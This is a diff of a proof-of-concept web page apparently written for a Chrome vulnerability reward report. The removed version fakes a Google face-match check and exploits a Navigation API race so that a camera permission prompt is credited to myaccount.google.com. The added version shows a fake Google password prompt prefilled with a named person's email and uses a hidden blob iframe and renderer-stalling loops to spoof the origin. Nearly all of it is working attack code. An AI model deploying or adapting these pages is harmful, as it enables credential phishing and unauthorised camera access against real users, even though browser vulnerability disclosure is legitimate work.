@@ -1,88 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome VRP: Permission Attribution Bypass</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Chrome VRP: Origin Confusion</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
-        .box { border: 1px solid #dadce0; padding: 30px; border-radius: 12px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
-        .btn { background: #1a73e8; color: white; border: none; padding: 18px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; font-weight: 500; }
-        #status { margin-top: 25px; font-size: 14px; font-family: monospace; padding: 10px; border-radius: 4px; }
-        .loading { color: #5f6368; }
-        .success { color: #1e8e3e; background: #e6f4ea; }
-        .error { color: #d93025; background: #fce8e6; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
+        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 12px; max-width: 350px; margin: 0 auto; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" alt="Google">
-    <h2>Security Verification</h2>
-    <p>Google needs to verify your identity using a quick face-match check.</p>
-    <button class="btn" id="startBtn">Verify Identity</button>
-</div>
+    <div id="ui">
+        <div class="box">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
+            <h3>Security Alert</h3>
+            <p>Please confirm your password to continue.</p>
+            <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background:#f1f3f4;">
+            <input type="password" placeholder="Password">
+            <button class="btn" onclick="triggerDoubleBlob()">Sign In</button>
+        </div>
+    </div>
 
-<div id="status">Status: Waiting for interaction...</div>
+    <script>
+        function triggerDoubleBlob() {
+            const target = "https://myaccount.google.com/?pli=1";
+            
+            // 1. Create a malicious blob that will trigger the 'real' navigation
+            // This 'middle-man' script is what creates the origin confusion
+            const blobCode = `
+                <script>
+                    window.parent.location.href = "${target}";
+                    let start = Date.now();
+                    while (Date.now() - start < 4000) { /* Stall the renderer */ }
+                <\/script>
+            `;
+            const blob = new Blob([blobCode], {type: 'text/html'});
+            const blobUrl = URL.createObjectURL(blob);
 
-<script>
-    const status = document.getElementById('status');
-    const startBtn = document.getElementById('startBtn');
+            // 2. Create an iframe to host the blob
+            const ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            ifr.src = blobUrl;
+            document.body.appendChild(ifr);
 
-    // 1. Navigation API Support Check
-    if (!window.navigation) {
-        status.innerText = "Error: Navigation API not found. Please use Chrome 102+ on Android.";
-        status.className = "error";
-    }
-
-    async function triggerExploit() {
-        // High-value target: The Google Account page
-        const target = "https://myaccount.google.com/?pli=1";
-        
-        status.innerText = "Initiating transition...";
-        status.className = "loading";
-
-        // 2. Add the 'navigate' listener to intercept the jump
-        navigation.addEventListener('navigate', (event) => {
-            if (event.destination.url.includes("google.com")) {
-                event.intercept({
-                    handler: async () => {
-                        // 3. The Race Window
-                        // The URL bar has likely committed to Google by now.
-                        // We wait for the browser UI to settle (approx 1 second)
-                        status.innerText = "URL COMMITTED. ATTRIBUTING PERMISSION...";
-                        
-                        await new Promise(r => setTimeout(r, 1200));
-
-                        // 4. Trigger the permission prompt
-                        // We use Camera (getUserMedia) because it's higher reward
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                            
-                            status.innerText = "VULNERABILITY CONFIRMED: Permission granted under fake origin.";
-                            status.className = "success";
-                            
-                            // Stop the camera once we confirm the bypass
-                            stream.getTracks().forEach(track => track.stop());
-                        } catch (err) {
-                            status.innerText = "Permission Result: " + err.name;
-                            status.className = "error";
-                        }
-
-                        // Keep the renderer stalled for 5 seconds to allow for recording/screenshots
-                        await new Promise(r => setTimeout(r, 5000));
-                        location.reload();
-                    }
-                });
+            // 3. The Race: While the iframe is forcing the 'top' window to Google,
+            // we keep the main page busy so it doesn't clear the screen.
+            let frames = 0;
+            function hold() {
+                frames++;
+                // Busy work to prevent 'Paint'
+                const s = Date.now();
+                while(Date.now() - s < 100) {} 
+                
+                if (frames < 40) requestAnimationFrame(hold);
             }
-        }, { once: true });
-
-        // 5. Start the navigation
-        window.location.href = target;
-    }
-
-    startBtn.addEventListener('click', triggerExploit);
-</script>
-
+            requestAnimationFrame(hold);
+        }
+    </script>
 </body>
 </html>
